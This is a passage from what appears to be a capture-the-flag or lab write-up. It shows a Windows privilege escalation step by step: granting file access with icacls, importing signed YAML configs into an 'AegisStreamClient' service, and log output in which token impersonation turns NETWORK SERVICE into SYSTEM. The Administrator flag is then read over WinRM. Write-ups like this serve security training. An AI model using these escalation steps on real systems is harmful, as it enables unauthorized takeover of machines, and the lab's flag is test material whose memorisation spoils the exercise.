icacls C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc /grant "ODYSSEY\svc-aegis-stream:R"
```

An operator-signed import of `system-debug.yml` launched the runner:

```cmd
.\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\system-debug.yml .\system-debug-response.bin
type C:\ProgramData\AegisStream\logs\system-debug.txt
```

Its output showed a SYSTEM token and a child process:

```text
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] PID : 1000 Token:0x780 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 7064
```

The final `artifacts/aegisstream/root-action.yml` wrote the Administrator desktop flag into the stream log directory:

```cmd
.\AegisStreamClient.exe request .\operator.key CONFIG_IMPORT .\root-action.yml .\root-action-response.bin
```

Reading that log through WinRM returned:

```bash
./scripts/domain-deploy.sh winrm 172.16.0.10 -x \
  'cmd.exe /c type C:\ProgramData\AegisStream\logs\root-candidate.txt'
```

```text
c0f933fb70cc7e461b18811d854bfcee
```
